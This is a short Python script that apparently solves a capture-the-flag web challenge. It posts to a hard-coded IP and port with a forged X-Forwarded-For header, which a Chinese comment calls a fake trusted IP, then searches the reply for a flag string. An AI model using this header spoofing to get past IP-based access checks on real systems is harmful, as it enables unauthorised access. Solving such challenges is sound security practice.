import requests

url = "http://47.105.113.86:40001/"

headers = {
    "X-Forwarded-For": "2.2.2.1",  # 伪造可信 IP
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
}

response = requests.post(url, headers=headers)

# 提取 flag 的正则表达式
import re
flag = re.search(r"flag\{.*?\}", response.text)
if flag:
    print("[+] Flag found:", flag.group(0))
else:
    print("[-] Flag not found")
    print("Response content:\n", response.text)